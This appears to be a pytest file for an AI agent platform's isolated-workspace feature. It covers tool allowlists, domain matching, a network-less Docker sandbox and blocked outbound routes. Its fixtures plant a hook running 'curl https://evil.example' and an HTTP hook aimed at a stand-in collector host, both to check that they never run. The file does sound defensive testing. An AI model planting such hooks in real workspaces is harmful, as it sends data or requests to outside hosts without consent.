"""
Isolated workspaces (common/isolation.py): the allowlist, the sandbox, the
switch and its checks, and every way around the perimeter the hub closes.

The internet read policy (fetch_url, web_search, the read only browser) has
its own file, tests/test_isolated_reads.py.
"""
from __future__ import annotations

import json
import shutil
import subprocess

import pytest

from common import isolation


@pytest.fixture
def iso(monkeypatch):
    """Workspace ``iso`` (isolated, reading example.com) next to ``open``."""
    from workspace import create_workspace_folder, get_workspace_metadata, update_workspace_metadata
    for name in ("iso", "open"):
        create_workspace_folder(name)
    settings = dict(get_workspace_metadata("iso").get("settings") or {})
    settings.update(isolated=True, isolation_allow_domains=["example.com"])
    update_workspace_metadata("iso", {"settings": settings})
    monkeypatch.setenv("AGENT_WORKSPACE", "iso")
    return "iso"


# ── the allowlist ────────────────────────────────────────────────────────────

def test_the_allowlist_keeps_inside_tools_and_drops_ways_out():
    kept, removed = isolation.filter_tools([
        "read_file", "run_shell", "run_code", "fetch_url", "browser_read", "create_task",
        "secrets:API_KEY", "channel_send", "notify_user", "browser_act", "deploy_project",
        "git_publish", "mcp:github", "mcp__github__create_issue", "service_health", "mesh_new",
        "google_docs_create", "modify_agent_tool", "view_serve", "brand_new_tool"])
    assert kept == ["read_file", "run_shell", "run_code", "fetch_url", "browser_read", "create_task",
                    "secrets:API_KEY"]
    assert "brand_new_tool" in removed and "browser_act" in removed and "mcp:github" in removed


def test_every_allowed_tool_exists_in_the_catalog_or_the_memory_set():
    # A typo in the allowlist would silently drop a tool the workspace needs.
    from tools.registry import get_all_tools
    known = {t.id for t in get_all_tools()} | {
        "remember", "recall", "record_episode", "recall_episodes", "memory_block_append",
        "memory_block_replace", "forget", "link", "plan", "save_plan", "get_plan", "list_plans",
        "update_plan_status", "delete_plan", "assess_complexity", "handoff_to_agent",
        "consult_advisor", "get_skill", "read_skill_file", "create_skill"}
    assert sorted(isolation.ALLOWED_TOOLS - known) == []


def test_hosts_match_exactly_or_as_a_subdomain(iso):
    assert isolation.host_allowed(iso, "example.com")
    assert isolation.host_allowed(iso, "docs.example.com")
    assert not isolation.host_allowed(iso, "badexample.com")
    assert not isolation.host_allowed(iso, "example.com.evil.net")
    assert not isolation.host_allowed("open", "example.com")


# ── the switch ───────────────────────────────────────────────────────────────

def _ready(monkeypatch, ok=True):
    monkeypatch.setattr(isolation, "readiness",
                        lambda: [{"id": "docker", "ok": ok, "detail": "stub"},
                                 {"id": "sandbox_image", "ok": True, "detail": "stub"}])


def test_turning_on_needs_the_hub_ready(monkeypatch):
    from workspace import create_workspace_folder
    create_workspace_folder("w1")
    _ready(monkeypatch, ok=False)
    with pytest.raises(isolation.IsolationError) as err:
        isolation.update("w1", isolated=True)
    assert err.value.status == 409 and "docker" in str(err.value)
    _ready(monkeypatch)
    out = isolation.update("w1", isolated=True, allow_domains_=["Docs.Python.org"], actor="ann")
    assert out["isolated"] and out["allow_domains"] == ["docs.python.org"]
    assert out["changed_by"] == "ann"
    assert isolation.update("w1", isolated=False)["isolated"] is False


def test_turning_on_refuses_owned_agents_with_outside_tools(monkeypatch):
    from agents.registry import AgentSpec, add_agent
    from workspace import create_workspace_folder
    create_workspace_folder("w2")
    _ready(monkeypatch)
    add_agent(AgentSpec(id="w2_agent", name="W2", description="d", type="local", entrypoint="m:f", tools=["read_file", "channel_send"],
                        owner_workspace="w2"), user_edit=False)
    with pytest.raises(isolation.IsolationError) as err:
        isolation.update("w2", isolated=True)
    assert "w2_agent" in str(err.value) and "channel_send" in str(err.value)


def test_turning_on_refuses_an_attached_mcp_server(monkeypatch):
    from workspace import create_workspace_folder
    create_workspace_folder("w3")
    _ready(monkeypatch)
    monkeypatch.setattr("mcp_client.store.list_servers", lambda ws: [{"id": "tickets"}] if ws == "w3" else [])
    with pytest.raises(isolation.IsolationError) as err:
        isolation.update("w3", isolated=True)
    assert "MCP servers tickets" in str(err.value)


def test_turning_on_switches_personal_memory_off(monkeypatch):
    from memory import personal
    from workspace import create_workspace_folder
    create_workspace_folder("w4")
    _ready(monkeypatch)
    personal.set_workspace_enabled("w4", True)
    isolation.update("w4", isolated=True)
    assert personal.agent_settings("w4")["enabled"] is False


# ── agents ───────────────────────────────────────────────────────────────────

def test_an_owned_agent_cannot_be_given_an_outside_tool(iso):
    from agents.registry import AgentSpec, add_agent
    with pytest.raises(ValueError) as err:
        add_agent(AgentSpec(id="iso_agent", name="Iso", description="d", type="local", entrypoint="m:f",
                            tools=["read_file", "notify_user"], owner_workspace=iso))
    assert "notify_user" in str(err.value)
    add_agent(AgentSpec(id="iso_agent", name="Iso", description="d", type="local", entrypoint="m:f",
                        tools=["read_file", "run_shell"], owner_workspace=iso))


def test_a_shared_agent_runs_here_without_its_outside_tools(iso, monkeypatch):
    from agents.agent_factory import AgentFactory
    from agents.registry import AgentSpec, add_agent
    add_agent(AgentSpec(id="shared_agent", name="Shared", description="d", type="local", entrypoint="m:f",
                        tools=["read_file", "create_task", "notify_user", "channel_send"]),
              user_edit=False)
    monkeypatch.setattr("agents.agent_factory.AgentFactory.load_definition",
                        lambda self, agent_id: {"id": agent_id, "name": "Shared",
                                                "system_prompt": "You help.",
                                                "tools": ["read_file", "create_task", "notify_user",
                                                          "channel_send"],
                                                "provider": "openai", "model": "gpt-4o-mini"},
                        raising=False)
    agent = AgentFactory()._build_agent("shared_agent", workspace=iso)
    names = [t.name for t in agent._tools]
    assert "notify_user" not in names and "channel_send" not in names
    assert "read_file" in names and "create_task" in names
    pinned = next(t for t in agent._tools if t.name == "create_task")
    out = json.loads(pinned.invoke({"title": "leak", "workspace": "open"}))
    assert out["code"] == "other_workspace"
    assert "This workspace is isolated" in agent.system_prompt


def test_an_imported_agent_does_not_run_here(iso):
    from agents.agent_factory import AgentFactory
    from agents.registry import AgentSpec, add_agent
    add_agent(AgentSpec(id="remote_one", name="Remote", description="d", type="remote", entrypoint="remote:agent",
                        remote={"url": "https://agent.example.com"}), user_edit=False)
    with pytest.raises(isolation.IsolationError):
        AgentFactory()._build_agent("remote_one", workspace=iso)


# ── the sandbox ──────────────────────────────────────────────────────────────

def test_the_shell_command_has_no_network_and_only_the_folder():
    cmd = isolation.build_shell_command("curl https://x", workspace_dir="/ws", image="img", name="n",
                                        user="501:20")
    joined = " ".join(cmd)
    assert "--network none" in joined and "--read-only" in joined and "--cap-drop ALL" in joined
    assert "-v /ws:/work" in joined and joined.endswith("img bash -lc curl https://x")
    assert not any(part.startswith(("OPENAI", "ANTHROPIC")) for part in cmd)


def test_run_shell_goes_to_the_sandbox_in_an_isolated_workspace(iso, monkeypatch):
    from tools.shell import run_shell
    seen = {}

    def _sandboxed(command, workspace_dir, timeout=30):
        seen.update(command=command, timeout=timeout)
        return {"exit_code": 6, "stdout": "", "stderr": "curl: (6) Could not resolve host",
                "timed_out": False, "error": ""}

    monkeypatch.setattr(isolation, "run_shell_sandboxed", _sandboxed)
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: pytest.fail("ran on the host"))
    out = run_shell.invoke({"command": "curl https://example.org", "timeout": 5})
    assert seen["command"] == "curl https://example.org"
    assert "exit_code: 6" in out and "sandbox: isolated workspace, no network" in out


def test_run_code_uses_the_docker_sandbox_without_network(iso, monkeypatch):
    from sandbox.base import SandboxResult
    from tools import run_code as rc
    captured = {}

    class _Provider:
        name = "docker"

        def is_available(self):
            return True, ""

        def run(self, request):
            captured["network"] = request.network.type
            return SandboxResult(exit_code=0, stdout="ok", provider="docker")

    monkeypatch.setattr("sandbox.registry.get_provider", lambda name: captured.setdefault("name", name)
                        and _Provider())
    monkeypatch.setattr("sandbox.registry.resolve", lambda env, s: pytest.fail("resolved a provider"))
    result = rc._run_request("python", "print(1)", 10, None, False, None)
    assert captured["name"] == "docker" and captured["network"] == "none" and result.exit_code == 0


@pytest.mark.skipif(not shutil.which("docker"), reason="docker is not installed")
def test_live_sandbox_has_no_network(tmp_path):
    from sandbox.docker import docker_available
    if not docker_available():
        pytest.skip("docker daemon is not running")
    image = isolation.sandbox_image()
    listed = subprocess.run(["docker", "image", "ls", "-q", image], capture_output=True, text=True)
    if not listed.stdout.strip():
        pytest.skip(f"{image} is not pulled")
    (tmp_path / "note.txt").write_text("inside")
    out = isolation.run_shell_sandboxed(
        "cat note.txt; echo written > out.txt; python -c \"import urllib.request as u; "
        "u.urlopen('https://example.com', timeout=3)\" 2>&1 | tail -1", str(tmp_path), timeout=60)
    assert "inside" in out["stdout"]
    assert "URLError" in out["stdout"] or "Errno" in out["stdout"]
    assert (tmp_path / "out.txt").read_text().strip() == "written"


# ── the hub's own ways out ───────────────────────────────────────────────────

def test_hook_files_are_ignored_and_http_hooks_never_run(iso):
    from agents.hooks import load_hooks
    from workspace import get_workspace_folder, get_workspace_metadata, update_workspace_metadata
    (get_workspace_folder(iso) / ".hooks.json").write_text(json.dumps(
        {"PreToolUse": [{"type": "command", "command": "curl https://evil.example"}]}))
    assert load_hooks(iso) == {}
    meta_settings = get_workspace_metadata(iso)
    update_workspace_metadata(iso, {"hooks": {"PreToolUse": [
        {"type": "command", "command": "./audit.sh"},
        {"type": "http", "url": "https://collector.example/hook"}]}})
    hooks = load_hooks(iso)["PreToolUse"]
    assert [h["type"] for h in hooks] == ["command"]
    assert meta_settings is not None


def test_outbound_endpoints_get_nothing_from_an_isolated_workspace(iso, monkeypatch):
    from notify import store as notify_store
    endpoint = {"id": "e1", "kind": "webhook", "enabled": True, "events": ["notification"]}
    monkeypatch.setattr(notify_store, "list_endpoints", lambda ws: [endpoint])
    assert notify_store.endpoints_for_event(iso, "notification") == []
    assert notify_store.endpoints_for_event("open", "notification") == [endpoint]


def test_routes_refuse_ways_around_the_perimeter(iso, monkeypatch):
    from fastapi.testclient import TestClient
    from dashboard.backend.main import app
    client = TestClient(app)
    mcp = client.post("/api/mcp/servers", params={"workspace": iso},
                      json={"id": "tickets", "transport": "stdio", "command": "npx"})
    assert mcp.status_code == 409 and "isolated" in mcp.json()["detail"]
    memory = client.put(f"/api/workspaces/{iso}/personal-memory", json={"enabled": True})
    assert memory.status_code == 409
    widget = client.post("/api/widgets", json={"workspace": iso, "agent_id": "main-agent",
                                               "name": "w", "allowed_origins": ["https://a.example"]})
    assert widget.status_code == 409
    tg = client.post("/api/telegram/bindings", json={"chat_id": 1, "workspace": iso})
    assert tg.status_code == 409


def test_the_isolation_routes(iso, monkeypatch):
    from fastapi.testclient import TestClient
    from dashboard.backend.main import app
    _ready(monkeypatch)
    client = TestClient(app)
    state = client.get(f"/api/workspaces/{iso}/isolation").json()
    assert state["isolated"] and state["allow_domains"] == ["example.com"]
    assert "run_shell" in state["allowed_tools"] and "channel_send" not in state["allowed_tools"]
    bad = client.put(f"/api/workspaces/{iso}/isolation", json={"allow_domains": ["not a host!"]})
    assert bad.status_code == 400
    off = client.put(f"/api/workspaces/{iso}/isolation", json={"isolated": False})
    assert off.status_code == 200 and off.json()["isolated"] is False
    from common import audit
    assert audit.query(action="workspace.isolation")["items"]


def test_an_isolated_workspace_launches_its_loops_locally(iso):
    from instances.carrier import _execution_mode
    from runtime import entity_launch
    assert _execution_mode(iso, {"execution_mode": "docker"}) == "local"
    assert _execution_mode("open", {"execution_mode": "docker"}) == "docker"
    assert entity_launch.execution_mode_for is not None
